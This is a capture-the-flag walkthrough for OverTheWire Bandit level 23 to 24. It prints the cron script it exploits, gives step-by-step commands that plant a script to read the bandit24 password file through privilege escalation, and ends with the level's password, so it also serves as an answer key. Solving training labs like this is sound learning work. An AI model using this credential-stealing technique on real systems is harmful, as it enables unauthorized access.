Level-23 -> Level-24
Description: A program is running automatically at regular intervals from cron, the time-based job scheduler. 
             Look in /etc/cron.d/ for the configuration and see what command is being executed.
Explanation: The cron script's vulnerability lies in blindly executing any bandit23-owned executable in 
             /var/spool/bandit24/foo/ with elevated bandit24 privileges before deleting it; the exploit 
             abuses this by placing a malicious script there that runs as bandit24 to read the protected 
             /etc/bandit_pass/bandit24 file, bypassing direct permission restrictions through privilege 
             escalation, then redirects the stolen password to a world-readable tmp location accessible 
             by bandit23, completing within the 60-second timeout so cron auto-deletes only the script 
             afterward, leaving just the password behind.
Connection: ssh -p 2220 bandit23@bandit.labs.overthewire.org
Command-1: cd /etc/cron.d
Command-2: ls
Command-3: cat cronjob_bandit24
Command-4: cd /usr/bin
Command-5: cat cronjob_bandit24.sh
#!/bin/bash
shopt -s nullglob
myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
Command-6: mkdir -p /tmp/mytmp
Command-7: chmod 777 /tmp/mytmp
Command-8: touch /tmp/mytmp/password.txt
Command-9: chmod 777 /tmp/mytmp/password.txt
Command-10: cat > /tmp/mytmp/exploit.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mytmp/password.txt
EOF
chmod +x /tmp/mytmp/exploit.sh
Command-11: chmod +x /tmp/mytmp/exploit.sh
Command-12: cp /tmp/mytmp/exploit.sh /var/spool/bandit24/foo/
Command-13: cat /tmp/mytmp/password.txt
Level-24 Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ